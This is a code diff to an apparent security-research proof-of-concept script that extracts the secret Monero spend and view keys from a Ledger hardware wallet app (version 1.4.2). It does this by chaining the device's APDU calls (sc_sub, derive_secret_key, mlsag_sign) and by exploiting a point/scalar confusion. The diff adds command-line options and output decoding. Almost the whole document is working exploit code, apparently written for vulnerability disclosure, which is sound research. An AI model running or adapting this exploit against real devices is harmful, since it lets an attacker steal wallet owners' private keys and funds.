@@ -3,6 +3,7 @@
 # @author: ph4r05
 
 import binascii
+import argparse
 from ledgerblue.comm import getDongle
 from ledgerblue.commException import CommException
 from monero_glue.xmr import crypto
@@ -26,6 +27,7 @@ def ksize(x):
 
 class PoC:
     def __init__(self, dongle, lite=True):
+        self.args = None
         self.dongle = dongle
         self.tx_open = False
         self.r = None
@@ -117,35 +119,35 @@ class PoC:
 
         # 1. call `monero_apdu_generate_keypair()`, obtain `{enc(x), hmac(enx(x))}`, where `x` is unknown.
         _, sec = self.gen_kp()
-        print('  1. rsec: %s' % self.fmtkey(sec))
+        print('  1. rsec: %s' % self.fmtkey(sec).decode('ascii'))
 
         # 2. call `sc_sub(enc(x), hmac(enc(x)), enc(x), hmac(enc(x)))`, obtain `{enc(0), hmac(enc(0))}`
         zero = self.sc_sub(sec, sec)
-        print('  2. zero: %s' % self.fmtkey(zero))
+        print('  2. zero: %s' % self.fmtkey(zero).decode('ascii'))
 
         # 3. call `monero_apdu_derive_secret_key(
         #             enc(0), hmac(enc(0)), 0, C_FAKE_SEC_SPEND_KEY, hmac(C_FAKE_SEC_SPEND_KEY))`,
         #    obtain `{enc(r), hmac(enc(r))}`
         encr = self.derive_secret_key(zero, 0, self.fake_b)
-        print('  3. encr: %s' % self.fmtkey(encr))
+        print('  3. encr: %s' % self.fmtkey(encr).decode('ascii'))
 
         # 4. call `monero_apdu_mlsag_sign(enc(0), hmac(enc(0)), enc(r), hmac(enc(r)))`, obtain `r`
         r = self.mlsag_sign_s(zero, encr)
-        print('  4. r:  %s' % self.fmtkey(r))
+        print('  4. r:  %s' % self.fmtkey(r).decode('ascii'))
 
         # 5. compute b: `b = r - H_s(00....00 || varint(0))`
         hs0 = crypto.hash_to_scalar(bytearray(33))
         rsc = crypto.decodeint(r[0])
         bsc = crypto.sc_sub(rsc, hs0)
         b = crypto.encodeint(bsc)
-        print('  5. b:  %s' % binascii.hexlify(b))
+        print('  5. b:  %s' % binascii.hexlify(b).decode('ascii'))
 
         B = crypto.scalarmult_base(bsc)
-        print('  5. B:  %s' % binascii.hexlify(crypto.encodepoint(B)))
+        print('  5. B:  %s' % binascii.hexlify(crypto.encodepoint(B)).decode('ascii'))
 
         # 6. Verify
         BB = self.scalarmult(self.fake_b)
-        print('  6. bG: %s' % binascii.hexlify(BB))
+        print('  6. bG: %s' % binascii.hexlify(BB).decode('ascii'))
 
         if BB == crypto.encodepoint(B):
             print('[+] PoC successful')
@@ -167,13 +169,13 @@ class PoC:
         rsc = crypto.decodeint(r[0])
         asc = crypto.sc_sub(rsc, hs0)
         a = crypto.encodeint(asc)
-        print('  a:  %s' % binascii.hexlify(a))
+        print('  a:  %s' % binascii.hexlify(a).decode('ascii'))
 
         A = crypto.scalarmult_base(asc)
-        print('  A:  %s' % binascii.hexlify(crypto.encodepoint(A)))
+        print('  A:  %s' % binascii.hexlify(crypto.encodepoint(A)).decode('ascii'))
 
         AA = self.scalarmult(self.fake_a)
-        print('  aG: %s' % binascii.hexlify(AA))
+        print('  aG: %s' % binascii.hexlify(AA).decode('ascii'))
 
         main_addr = addr.encode_addr(
             xmr_net.net_version(xmr_net.NetworkTypes.MAINNET),
@@ -187,8 +189,8 @@ class PoC:
             crypto.encodepoint(A),
         )
 
-        print('Mainnet address: %s' % main_addr)
-        print('Testnet address: %s' % test_addr)
+        print('Mainnet address: %s' % main_addr.decode('ascii'))
+        print('Testnet address: %s' % test_addr.decode('ascii'))
 
     def find_confusion(self, A, N=10000):
         """find x, s.t.: [8*x*A]_pt == [8*x*A]_sc"""
@@ -213,27 +215,27 @@ class PoC:
         Gx = crypto.encodepoint(crypto.scalarmult_base(crypto.sc_init(x)))
 
         print('  1. Confusion found, x: %d' % (x,))
-        print('     8xA:  %s' % binascii.hexlify(A8x))
-        print('       A:  %s' % binascii.hexlify(A))
-        print('      xG:  %s' % binascii.hexlify(Gx))
+        print('     8xA:  %s' % binascii.hexlify(A8x).decode('ascii'))
+        print('       A:  %s' % binascii.hexlify(A).decode('ascii'))
+        print('      xG:  %s' % binascii.hexlify(Gx).decode('ascii'))
 
         # 2. gen_deriv (8*a*x*G) = enc(8x*A) = enc(P); we know {P, enc(P)};
         # It holds that P=8xA is also a valid scalar value, from the step above.
         P = self.gen_derivation(Gx, self.fake_a)
-        print('  2.   P:  %s' % (self.fmtkey(P),))
+        print('  2.   P:  %s' % (self.fmtkey(P).decode('ascii'),))
 
         # 3. get_secret_key: s1 = Hs(P||0) + s
         sp = self.derive_secret_key(P, 0, self.fake_b)
-        print('  3.   sp: %s' % (self.fmtkey(sp),))
+        print('  3.   sp: %s' % (self.fmtkey(sp).decode('ascii'),))
 
         # 4. mlsag_hash(p2=1, opt=0x80) = c
         c = self.mlsag_hash()
-        print('  4.   c:  %s' % (binascii.hexlify(c),))
+        print('  4.   c:  %s' % (binascii.hexlify(c).decode('ascii'),))
 
         # 5. mlsag_sign(s1, enc(P)), r1 = enc(s1 - Pc) = enc(Hs(P||0) + s - Pc);
         # We have R = Hs(P||0) + s - Pc -> R - Hs(P||0) + Pc = s
         r = self.mlsag_sign_s(P, sp)
-        print('  5.   r:  %s' % (binascii.hexlify(r[0]),))
+        print('  5.   r:  %s' % (binascii.hexlify(r[0]).decode('ascii'),))
 
         # Extract the spend key
         hs0 = crypto.hash_to_scalar(bytearray(A8x) + bytearray(1))
@@ -241,14 +243,14 @@ class PoC:
         rsc = crypto.sc_sub(rsc, hs0)
         bsc = crypto.sc_add(rsc, crypto.sc_mul(crypto.decodeint(c), crypto.decodeint(A8x)))
         b = crypto.encodeint(bsc)
-        print('  5.   b:  %s' % binascii.hexlify(b))
+        print('  5.   b:  %s' % binascii.hexlify(b).decode('ascii'))
 
         B = crypto.scalarmult_base(bsc)
-        print('  5.   B:  %s' % binascii.hexlify(crypto.encodepoint(B)))
+        print('  5.   B:  %s' % binascii.hexlify(crypto.encodepoint(B)).decode('ascii'))
 
         # 6. Verify
         BB = self.scalarmult(self.fake_b)
-        print('  6.   bG: %s\n' % binascii.hexlify(BB))
+        print('  6.   bG: %s\n' % binascii.hexlify(BB).decode('ascii'))
 
         if BB == crypto.encodepoint(B):
             print('[+] PoC successful')
@@ -259,11 +261,27 @@ class PoC:
         for x in self.commands:
             print('  %s' % x)
 
+    def main(self):
+        parser = argparse.ArgumentParser(description='Ledger Monero App 1.4.2 spend key extraction demo')
+        parser.add_argument('--poc1', dest='poc1', action='store_const', const=True, default=False,
+                            help='PoC with sc_sub')
+        parser.add_argument('--poc2', dest='poc2', action='store_const', const=True, default=False,
+                            help='PoC with sc_sub')
+        parser.add_argument('--extra', dest='extra', action='store_const', const=True, default=False,
+                            help='PoC 1 with extra address extraction')
+        self.args, unparsed = parser.parse_known_args()
+        self.lite = not self.args.extra
+        if self.args.poc1:
+            self.poc()
+
+        if self.args.poc2 or (not self.args.poc1 and not self.args.poc2):
+            self.poc2()
+
 
 def main():
     dongle = getDongle(False)
     poc = PoC(dongle, True)
-    poc.poc2()
+    poc.main()
 
 
 if __name__ == '__main__':
